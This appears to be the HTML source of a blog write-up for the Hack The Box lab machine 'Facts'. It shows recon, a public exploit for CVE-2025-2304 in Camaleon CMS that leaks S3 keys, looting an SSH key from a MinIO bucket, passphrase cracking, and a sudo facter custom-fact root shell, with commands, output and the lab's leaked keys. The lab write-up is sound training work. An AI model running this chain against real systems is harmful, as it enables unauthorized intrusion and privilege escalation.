@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB: Facts | d3vilsec</title>
+<meta name="keywords" content="htb, writeup, linux, camaleon-cms, s3, minio, privilege-escalation, sudo, facter">
+<meta name="description" content="Walkthrough of the Hack The Box machine Facts — a Camaleon CMS privilege-escalation CVE leaks S3 credentials, a MinIO bucket gives up an SSH key, and a sudo-able facter binary loads a custom fact to land root.">
+<meta name="author" content="d3vilsec">
+<link rel="canonical" href="https://d3vilsec.com/blog/htb-facts/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.c711a8861c4337e70a4c623a70cf5d4f11f07a33d480982340205d8a3a7688ef.css" integrity="sha256-xxGohhxDN&#43;cKTGI6cM9dTxHwejPUgJgjQCBdijp2iO8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://d3vilsec.com/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://d3vilsec.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://d3vilsec.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://d3vilsec.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://d3vilsec.com/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://d3vilsec.com/blog/htb-facts/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://d3vilsec.com/blog/htb-facts/">
+  <meta property="og:site_name" content="d3vilsec">
+  <meta property="og:title" content="HTB: Facts">
+  <meta property="og:description" content="Walkthrough of the Hack The Box machine Facts — a Camaleon CMS privilege-escalation CVE leaks S3 credentials, a MinIO bucket gives up an SSH key, and a sudo-able facter binary loads a custom fact to land root.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2026-06-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-08T00:00:00+00:00">
+    <meta property="article:tag" content="Htb">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Camaleon-Cms">
+    <meta property="article:tag" content="S3">
+    <meta property="article:tag" content="Minio">
+    <meta property="og:image" content="https://d3vilsec.com/blog/htb-facts/01-facts-landing.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://d3vilsec.com/blog/htb-facts/01-facts-landing.png">
+  <meta name="twitter:title" content="HTB: Facts">
+  <meta name="twitter:description" content="Walkthrough of the Hack The Box machine Facts — a Camaleon CMS privilege-escalation CVE leaks S3 credentials, a MinIO bucket gives up an SSH key, and a sudo-able facter binary loads a custom fact to land root.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Blog",
+      "item": "https://d3vilsec.com/blog/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HTB: Facts",
+      "item": "https://d3vilsec.com/blog/htb-facts/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Facts",
+  "name": "HTB: Facts",
+  "description": "Walkthrough of the Hack The Box machine Facts — a Camaleon CMS privilege-escalation CVE leaks S3 credentials, a MinIO bucket gives up an SSH key, and a sudo-able facter binary loads a custom fact to land root.",
+  "keywords": [
+    "htb", "writeup", "linux", "camaleon-cms", "s3", "minio", "privilege-escalation", "sudo", "facter"
+  ],
+  "articleBody": "Difficulty: Easy · OS: Linux\nIntro This is the second box I’ve worked through. It’s rated Easy like Cap, but unlike Cap there’s no guided format to lean on here — this one I had to do solo style. That meant a lot more getting lost, researching things I’d never touched before, and stitching the pieces together myself. A couple of the steps (AWS/S3 tooling and the facter privesc) were brand new to me. Here’s how it went.\nRecon Ran an initial nmap scan to see what I’m working with.\n┌──(d3vilsec㉿kali)-[~] └─$ nmap -sV -sC 10.129.11.210 Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 19:20 -0700 Nmap scan report for 10.129.11.210 Host is up (0.086s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA) |_ 256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519) 80/tcp open http nginx 1.26.3 (Ubuntu) |_http-server-header: nginx/1.26.3 (Ubuntu) |_http-title: Did not follow redirect to http://facts.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Two ports open: SSH (22) and an nginx HTTP server on 80. The HTTP title tells me it wants to redirect to facts.htb, so I’ll need that name to resolve. Browsing to the page first:\nAdded an entry to /etc/hosts so the vhost resolves properly:\n10.129.11.210 facts.htb Enumerating the web app I tried fuzzing with ffuf, but got back an insane amount of 302 responses — not a useful signal, so that wasn’t the way in. Instead of brute-forcing paths, I dropped back to learning more about the site itself with nikto.\n┌──(d3vilsec㉿kali)-[~] └─$ nikto -h http://facts.htb ... + Server: nginx/1.26.3 (Ubuntu) + [999100] /: Uncommon header(s) 'plugin_front_cache' found, with contents: TRUE. + [000427] /server-status: Link header(s) ... /assets/themes/camaleon_first/assets/css/main-...css ... + [002743] /.bash_history: A user's home directory may be set to the web root... + [002757] /.ssh: A user's home directory may be set to the web root, an ssh file was retrieved. ... Two things jumped out. First, nikto flagged that a user’s home directory looks like it’s been set under the web root. Second — and the real lead — the asset paths reference a camaleon_first theme. This is Camaleon CMS.\nThe admin console let me self-register through a Create an Account link, so I made a throwaway test / test account.\nOnce logged in, the version is right there: Camaleon CMS 2.9.0.\nA known version number is exactly what you want — time to go hunting for a public exploit.\nCVE-2025-2304 — leaking S3 credentials Camaleon CMS 2.9.0 is vulnerable to CVE-2025-2304, an authenticated privilege-escalation bug. I used AlienOne’s PoC, which elevates the low-priv account to admin and then dumps the app’s configured S3 credentials.\n└─$ python3 ./Downloads/exploit.py -u http://facts.htb -U test -P test -e [+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated) [+]Login confirmed User ID: 5 Current User Role: admin [+]Loading PRIVILEGE ESCALATION User ID: 5 Updated User Role: admin [+]Extracting S3 Credentials s3 access key: AKIA2CD65746537B2692 s3 secret key: jcnPH3XIHIq6Ap873d4/EAbZPWfbj3HLBLxhVTPU s3 endpoint: http://localhost:54321 [+]Reverting User Role Honestly, this is where I got stuck for a while. I had a set of S3 keys and an endpoint and no idea what to do with them. I’d never worked with S3 before, so I had to go read up on what S3 even is and how you talk to it. The answer: the aws CLI, pointed at the box’s own S3 endpoint (port 54321).\nLooting the S3 bucket Configured a profile with the leaked keys and listed the buckets through the box’s endpoint:\n┌──(d3vilsec㉿kali)-[~] └─$ aws configure --profile facts AWS Access Key ID [None]: AKIA2CD65746537B2692 AWS Secret Access Key [None]: jcnPH3XIHIq6Ap873d4/EAbZPWfbj3HLBLxhVTPU Default region name [None]: Default output format [None]: ┌──(d3vilsec㉿kali)-[~] └─$ aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls 2025-09-11 05:06:52 internal 2025-09-11 05:06:52 randomfacts The internal bucket looks like someone’s home directory — and it has a .ssh/ folder.\n┌──(d3vilsec㉿kali)-[~] └─$ aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls internal PRE .bundle/ PRE .cache/ PRE .ssh/ 2026-01-08 10:45:13 220 .bash_logout 2026-01-08 10:45:13 3900 .bashrc 2026-01-08 10:47:17 20 .lesshst 2026-01-08 10:47:17 807 .profile ┌──(d3vilsec㉿kali)-[~] └─$ aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls internal/.ssh/ 2026-06-07 19:19:53 82 authorized_keys 2026-06-07 19:19:53 464 id_ed25519 A private key. Pulled it down:\n┌──(d3vilsec㉿kali)-[~] └─$ aws --profile facts --endpoint-url=http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 download: s3://internal/.ssh/id_ed25519 to ./id_ed25519 Cracking the key passphrase The key turned out to be passphrase-protected (and ssh-keygen complained about permissions first, so a quick chmod 600):\n┌──(d3vilsec㉿kali)-[~] └─$ chmod 600 id_ed25519 ┌──(d3vilsec㉿kali)-[~] └─$ ssh-keygen -y -f id_ed25519 Enter passphrase for \"id_ed25519\": Threw it at John the Ripper with rockyou:\n┌──(d3vilsec㉿kali)-[~] └─$ ssh2john id_ed25519 \u003e hash.txt ┌──(d3vilsec㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) ... dragonballz (id_ed25519) 1g 0:00:01:32 DONE (2026-06-08 10:18) ... Session completed. Passphrase is dragonballz. Unlocking the key reveals the owner in the comment field:\n┌──(d3vilsec㉿kali)-[~] └─$ ssh-keygen -y -f id_ed25519 Enter passphrase for \"id_ed25519\": ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPiQe3iMlyEc/KW13EGRmOhoom/L7n8zNXJx2XXSt4f6 trivia@facts.htb Getting a shell The key belongs to trivia. SSH in:\n┌──(d3vilsec㉿kali)-[~] └─$ ssh -i id_ed25519 trivia@facts.htb Enter passphrase for key 'id_ed25519': ... Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64) ... trivia@facts:~$ We’re in. Poking around /home, the permissions on william’s directory are loose enough to read:\ntrivia@facts:~$ ls -l /home total 8 drwxr-x--- 6 trivia trivia 4096 May 13 13:21 trivia drwxr-xr-x 2 william william 4096 Jan 26 11:40 william trivia@facts:~$ ls -l /home/william total 4 -rw-r--r-- 1 root william 33 Jun 8 02:20 user.txt trivia@facts:~$ cat /home/william/user.txt [REDACTED] User flag down.\nPrivilege escalation — sudo facter custom fact Checked trivia’s sudo rights:\ntrivia@facts:~$ sudo -l Matching Defaults entries for trivia on facts: env_reset, mail_badpass, secure_path=..., use_pty User trivia may run the following commands on facts: (ALL) NOPASSWD: /usr/bin/facter facter was new to me — it’s a Puppet tool that gathers and reports hardware/network/OS data about a system. The --help output had the lead I needed:\n[--custom-dir] A directory to use for custom facts. Facter loads “custom facts” — Ruby files — from a directory you point it at. Since I can run facter as root with no password, a custom fact that just execs a shell runs as root. I dropped a one-line Ruby file and pointed --custom-dir at it:\ntrivia@facts:~$ cat /tmp/d3vilsec/exploit.rb exec \"/bin/bash\" trivia@facts:~$ sudo facter --custom-dir /tmp/d3vilsec root@facts:/home/trivia# Root. Grabbed the final flag:\nroot@facts:/home/trivia# cat /root/root.txt [REDACTED] Takeaways Don’t brute-force when you can fingerprint. ffuf was a dead end here; nikto reading the asset paths handed me the exact CMS and theme, and the version was sitting in the admin panel. A known version number turns recon into a CVE lookup. CVE-2025-2304 in Camaleon CMS 2.9.0 escalates a self-registered account to admin and leaks the app’s S3 credentials — a reminder that app secrets stored server-side are only one bug away from exposure. The S3 endpoint was an internal MinIO instance, and a private SSH key sitting in a bucket is game over. Misconfigured object storage is a goldmine. The root cause of the privesc is a dangerous sudo entry: any binary that loads user-supplied code (here facter --custom-dir) is effectively a root shell. GTFOBins is the first place to check any binary you can run with sudo. Conclusion Facts was a good step up from Cap because there was no hand-holding — I had to figure out the path myself, and a big chunk of that was researching things I’d never seen before. First time touching the AWS/S3 CLI, first time abusing facter for privesc. I got genuinely lost after dumping the S3 keys and had to stop and learn what S3 even was before I could move.\nThe real lesson from this one is about researching the unknown efficiently. When I hit facter, knowing to check GTFOBins for a way to abuse a misconfigured binary is exactly the reflex I want to build. On to the next one.\n",
+  "wordCount" : "1301",
+  "inLanguage": "en",
+  "image":"https://d3vilsec.com/blog/htb-facts/01-facts-landing.png","datePublished": "2026-06-08T00:00:00Z",
+  "dateModified": "2026-06-08T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "d3vilsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://d3vilsec.com/blog/htb-facts/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "d3vilsec",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://d3vilsec.com/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://d3vilsec.com/" accesskey="h" title="d3vilsec (Alt + H)">d3vilsec</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="https://d3vilsec.com/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d3vilsec.com/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d3vilsec.com/cheatsheets/" title="Cheatsheets">
+                    <span>Cheatsheets</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d3vilsec.com/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d3vilsec.com/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/blog/">Blog</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      HTB: Facts
+    </h1>
+    <div class="post-description">
+      Walkthrough of the Hack The Box machine Facts — a Camaleon CMS privilege-escalation CVE leaks S3 credentials, a MinIO bucket gives up an SSH key, and a sudo-able facter binary loads a custom fact to land root.
+    </div>
+    <div class="post-meta">
+
+<span title='2026-06-08 00:00:00 +0000 UTC'>June 8, 2026</span>&nbsp;·&nbsp;<span>7 min</span>&nbsp;·&nbsp;<span>d3vilsec</span>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+            <img loading="eager"
+                srcset='https://d3vilsec.com/blog/htb-facts/01-facts-landing_hu_d25a5578e5f8f4.png 360w,https://d3vilsec.com/blog/htb-facts/01-facts-landing_hu_e68e16e583c0c1e6.png 480w,https://d3vilsec.com/blog/htb-facts/01-facts-landing_hu_6194144b27857d36.png 720w,https://d3vilsec.com/blog/htb-facts/01-facts-landing_hu_dbc93af4c1e47682.png 1080w,https://d3vilsec.com/blog/htb-facts/01-facts-landing.png 1275w'
+                src="https://d3vilsec.com/blog/htb-facts/01-facts-landing.png"
+                sizes="(min-width: 768px) 720px, 100vw"
+                width="1275" height="1031"
+                alt="Facts landing page">
+        
+</figure><details class="toc" >
+    <summary accesskey="c" title="(Alt + C)">
+        <span class="title">Table of Contents</span>
+    </summary>
+
+    <div class="inner"><ul>
+            <li>
+                <a href="#intro" aria-label="Intro">Intro</a></li>
+            <li>
+                <a href="#recon" aria-label="Recon">Recon</a></li>
+            <li>
+                <a href="#enumerating-the-web-app" aria-label="Enumerating the web app">Enumerating the web app</a></li>
+            <li>
+                <a href="#cve-2025-2304--leaking-s3-credentials" aria-label="CVE-2025-2304 — leaking S3 credentials">CVE-2025-2304 — leaking S3 credentials</a></li>
+            <li>
+                <a href="#looting-the-s3-bucket" aria-label="Looting the S3 bucket">Looting the S3 bucket</a></li>
+            <li>
+                <a href="#cracking-the-key-passphrase" aria-label="Cracking the key passphrase">Cracking the key passphrase</a></li>
+            <li>
+                <a href="#getting-a-shell" aria-label="Getting a shell">Getting a shell</a></li>
+            <li>
+                <a href="#privilege-escalation--sudo-facter-custom-fact" aria-label="Privilege escalation — sudo facter custom fact">Privilege escalation — sudo facter custom fact</a></li>
+            <li>
+                <a href="#takeaways" aria-label="Takeaways">Takeaways</a></li>
+            <li>
+                <a href="#conclusion" aria-label="Conclusion">Conclusion</a>
+            </li>
+        </ul>
+    </div>
+</details>
+
+  <div class="post-content md-content"><p><strong>Difficulty:</strong> Easy · <strong>OS:</strong> Linux</p>
+<h2 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h2>
+<p>This is the second box I&rsquo;ve worked through. It&rsquo;s rated Easy like Cap, but unlike Cap there&rsquo;s no guided format to lean on here — this one I had to do solo style. That meant a lot more getting lost, researching things I&rsquo;d never touched before, and stitching the pieces together myself. A couple of the steps (AWS/S3 tooling and the <code>facter</code> privesc) were brand new to me. Here&rsquo;s how it went.</p>
+<h2 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h2>
+<p>Ran an initial nmap scan to see what I&rsquo;m working with.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC 10.129.11.210
+</span></span><span style="display:flex;"><span>Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 19:20 -0700
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.129.11.210
+</span></span><span style="display:flex;"><span>Host is up (0.086s latency).
+</span></span><span style="display:flex;"><span>Not shown: 998 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.26.3 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.26.3 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://facts.htb/
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Two ports open: SSH (22) and an nginx HTTP server on 80. The HTTP title tells me it wants to redirect to <code>facts.htb</code>, so I&rsquo;ll need that name to resolve. Browsing to the page first:</p>
+<p><img alt="Facts landing page" loading="lazy" src="/blog/htb-facts/01-facts-landing.png"></p>
+<p>Added an entry to <code>/etc/hosts</code> so the vhost resolves properly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>10.129.11.210 facts.htb
+</span></span></code></pre></div><p><img alt="Site resolving after the hosts entry" loading="lazy" src="/blog/htb-facts/02-facts-hosts-resolved.png"></p>
+<h2 id="enumerating-the-web-app">Enumerating the web app<a hidden class="anchor" aria-hidden="true" href="#enumerating-the-web-app">#</a></h2>
+<p>I tried fuzzing with <code>ffuf</code>, but got back an insane amount of <code>302</code> responses — not a useful signal, so that wasn&rsquo;t the way in. Instead of brute-forcing paths, I dropped back to learning more about the site itself with <code>nikto</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ nikto -h http://facts.htb
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>+ Server: nginx/1.26.3 (Ubuntu)
+</span></span><span style="display:flex;"><span>+ [999100] /: Uncommon header(s) &#39;plugin_front_cache&#39; found, with contents: TRUE.
+</span></span><span style="display:flex;"><span>+ [000427] /server-status: Link header(s) ... /assets/themes/camaleon_first/assets/css/main-...css ...
+</span></span><span style="display:flex;"><span>+ [002743] /.bash_history: A user&#39;s home directory may be set to the web root...
+</span></span><span style="display:flex;"><span>+ [002757] /.ssh: A user&#39;s home directory may be set to the web root, an ssh file was retrieved.
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Two things jumped out. First, <code>nikto</code> flagged that a user&rsquo;s home directory looks like it&rsquo;s been set under the web root. Second — and the real lead — the asset paths reference a <code>camaleon_first</code> theme. This is <strong>Camaleon CMS</strong>.</p>
+<p>The admin console let me self-register through a <em>Create an Account</em> link, so I made a throwaway <code>test</code> / <code>test</code> account.</p>
+<p><img alt="Creating an account on the admin console" loading="lazy" src="/blog/htb-facts/03-create-account.png"></p>
+<p>Once logged in, the version is right there: <strong>Camaleon CMS 2.9.0</strong>.</p>
+<p><img alt="Camaleon CMS 2.9.0 admin" loading="lazy" src="/blog/htb-facts/04-camaleon-cms.png"></p>
+<p>A known version number is exactly what you want — time to go hunting for a public exploit.</p>
+<h2 id="cve-2025-2304--leaking-s3-credentials">CVE-2025-2304 — leaking S3 credentials<a hidden class="anchor" aria-hidden="true" href="#cve-2025-2304--leaking-s3-credentials">#</a></h2>
+<p>Camaleon CMS 2.9.0 is vulnerable to <strong>CVE-2025-2304</strong>, an authenticated privilege-escalation bug. I used <a href="https://github.com/Alien0ne/CVE-2025-2304">AlienOne&rsquo;s PoC</a>, which elevates the low-priv account to admin and then dumps the app&rsquo;s configured S3 credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>└─$ python3 ./Downloads/exploit.py -u http://facts.htb -U test -P test -e
+</span></span><span style="display:flex;"><span>[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
+</span></span><span style="display:flex;"><span>[+]Login confirmed
+</span></span><span style="display:flex;"><span>   User ID: 5
+</span></span><span style="display:flex;"><span>   Current User Role: admin
+</span></span><span style="display:flex;"><span>[+]Loading PRIVILEGE ESCALATION
+</span></span><span style="display:flex;"><span>   User ID: 5
+</span></span><span style="display:flex;"><span>   Updated User Role: admin
+</span></span><span style="display:flex;"><span>[+]Extracting S3 Credentials
+</span></span><span style="display:flex;"><span>   s3 access key: AKIA2CD65746537B2692
+</span></span><span style="display:flex;"><span>   s3 secret key: jcnPH3XIHIq6Ap873d4/EAbZPWfbj3HLBLxhVTPU
+</span></span><span style="display:flex;"><span>   s3 endpoint: http://localhost:54321
+</span></span><span style="display:flex;"><span>[+]Reverting User Role
+</span></span></code></pre></div><p>Honestly, this is where I got stuck for a while. I had a set of S3 keys and an endpoint and no idea what to do with them. I&rsquo;d never worked with S3 before, so I had to go read up on what S3 even is and how you talk to it. The answer: the <code>aws</code> CLI, pointed at the box&rsquo;s own S3 endpoint (port <code>54321</code>).</p>
+<h2 id="looting-the-s3-bucket">Looting the S3 bucket<a hidden class="anchor" aria-hidden="true" href="#looting-the-s3-bucket">#</a></h2>
+<p>Configured a profile with the leaked keys and listed the buckets through the box&rsquo;s endpoint:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ aws configure --profile facts
+</span></span><span style="display:flex;"><span>AWS Access Key ID [None]: AKIA2CD65746537B2692
+</span></span><span style="display:flex;"><span>AWS Secret Access Key [None]: jcnPH3XIHIq6Ap873d4/EAbZPWfbj3HLBLxhVTPU
+</span></span><span style="display:flex;"><span>Default region name [None]:
+</span></span><span style="display:flex;"><span>Default output format [None]:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls
+</span></span><span style="display:flex;"><span>2025-09-11 05:06:52 internal
+</span></span><span style="display:flex;"><span>2025-09-11 05:06:52 randomfacts
+</span></span></code></pre></div><p>The <code>internal</code> bucket looks like someone&rsquo;s home directory — and it has a <code>.ssh/</code> folder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls internal
+</span></span><span style="display:flex;"><span>                           PRE .bundle/
+</span></span><span style="display:flex;"><span>                           PRE .cache/
+</span></span><span style="display:flex;"><span>                           PRE .ssh/
+</span></span><span style="display:flex;"><span>2026-01-08 10:45:13        220 .bash_logout
+</span></span><span style="display:flex;"><span>2026-01-08 10:45:13       3900 .bashrc
+</span></span><span style="display:flex;"><span>2026-01-08 10:47:17         20 .lesshst
+</span></span><span style="display:flex;"><span>2026-01-08 10:47:17        807 .profile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls internal/.ssh/
+</span></span><span style="display:flex;"><span>2026-06-07 19:19:53         82 authorized_keys
+</span></span><span style="display:flex;"><span>2026-06-07 19:19:53        464 id_ed25519
+</span></span></code></pre></div><p>A private key. Pulled it down:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ aws --profile facts --endpoint-url=http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
+</span></span><span style="display:flex;"><span>download: s3://internal/.ssh/id_ed25519 to ./id_ed25519
+</span></span></code></pre></div><h2 id="cracking-the-key-passphrase">Cracking the key passphrase<a hidden class="anchor" aria-hidden="true" href="#cracking-the-key-passphrase">#</a></h2>
+<p>The key turned out to be passphrase-protected (and <code>ssh-keygen</code> complained about permissions first, so a quick <code>chmod 600</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ chmod 600 id_ed25519
+</span></span><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ ssh-keygen -y -f id_ed25519
+</span></span><span style="display:flex;"><span>Enter passphrase for &#34;id_ed25519&#34;:
+</span></span></code></pre></div><p>Threw it at John the Ripper with rockyou:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
